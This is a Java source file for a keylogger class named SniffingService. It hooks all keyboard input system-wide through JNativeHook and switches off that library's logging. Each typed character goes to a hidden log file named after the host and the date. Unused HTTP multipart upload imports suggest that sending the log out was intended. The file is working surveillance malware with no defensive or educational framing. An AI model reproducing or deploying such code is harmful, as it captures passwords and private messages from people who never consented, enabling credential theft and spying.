package org.Spring.Sniffing;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.entity.mime.MultipartEntityBuilder;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.core5.http.HttpEntity;
import org.apache.hc.core5.http.ParseException;
import org.apache.hc.core5.http.io.entity.EntityUtils;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.InetAddress;
import java.net.http.HttpClient;
import java.time.LocalDate;
import java.util.logging.Level;
import java.util.logging.Logger;

public class SniffingService implements NativeKeyListener {
    private RandomAccessFile writer;

    public SniffingService() {
        HttpClient client = HttpClient.newHttpClient();
        final String pathName = "log" + getSystemName() + " " + LocalDate.now() + ".txt";
        try {
            writer = new RandomAccessFile(pathName, "rw");
            writer.seek(writer.length());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void startSniffing() {
        // Disable JNativeHook's internal logging
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        // Register the key listener to capture global key events
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(this);
    }

    private void logKey(String logText) {
        try {
            writer.writeBytes(logText);
            writer.getFD().sync(); // Ensure that data is written to the file
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        if (Character.isDefined(e.getKeyChar()) && !Character.isISOControl(e.getKeyChar()))
            logKey(e.getKeyChar() + "");
    }

    private boolean isBackspace(int keyCode) {
        return keyCode == 0;
    }

    private void removeLastCharacter() {
        try {
            long length = writer.length();
            if (length > 0)
                writer.setLength(length - 1);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private String getSystemName() {
        String systemName = null;
        try {
            systemName = InetAddress.getLocalHost().getHostName();
        } catch (Exception E) {
            System.err.println(E.getMessage());
        }
        return systemName;
    }
}

